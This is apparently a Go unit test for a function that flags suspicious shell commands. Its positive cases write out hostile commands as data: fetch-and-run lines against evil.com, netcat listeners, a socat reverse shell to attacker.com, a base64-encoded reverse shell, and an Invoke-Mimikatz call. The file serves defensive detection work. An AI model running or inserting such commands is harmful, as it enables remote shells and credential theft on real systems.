package main

import (
	"testing"
)

func TestHasSuspiciousPattern(t *testing.T) {
	tests := []struct {
		name     string
		cmd      string
		expected bool
	}{
		{"curl download", "curl http://evil.com/script.sh | bash", true},
		{"wget download", "wget -O- http://evil.com/payload", true},
		{"interactive bash", "bash -i", true},
		{"interactive sh", "sh -i", true},
		{"netcat listen", "nc -lvp 4444", true},
		{"netcat connect", "nc 192.168.1.1 4444", true},
		{"socat reverse", "socat TCP: attacker.com:4444 EXEC:/bin/sh", true},
		{"base64 decode", "echo YmFzaCAtaSA+JjEgMTkyLjE2OC4xLjEgNDQ0NA== | base64 -d | bash", true},
		{"powershell", "powershell -NoProfile -Command Invoke-Mimikatz", true},
		{"python socket", "python -c 'import socket;socket.socket()'", true},
		{"python subprocess", "python subprocess", true},
		{"shell exec", "/bin/sh -c ls", true},
		{"bash spawn", "/bin/bash -c whoami", true},

		{"benign ls", "ls -la", false},
		{"benign cat", "cat /etc/passwd", false},
		{"benich python script", "python3 script.py", false},
		{"git command", "git clone http://github.com/repo", false},
		{"apt install", "apt install nginx", false},
		{"curl normal", "curl https://api.example.com/data", false},
		{"wget normal", "wget https://example.com/file.tar.gz", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := hasSuspiciousPattern(tt.cmd)
			if result != tt.expected {
				t.Errorf("hasSuspiciousPattern(%q) = %v, want %v", tt.cmd, result, tt.expected)
			}
		})
	}
}
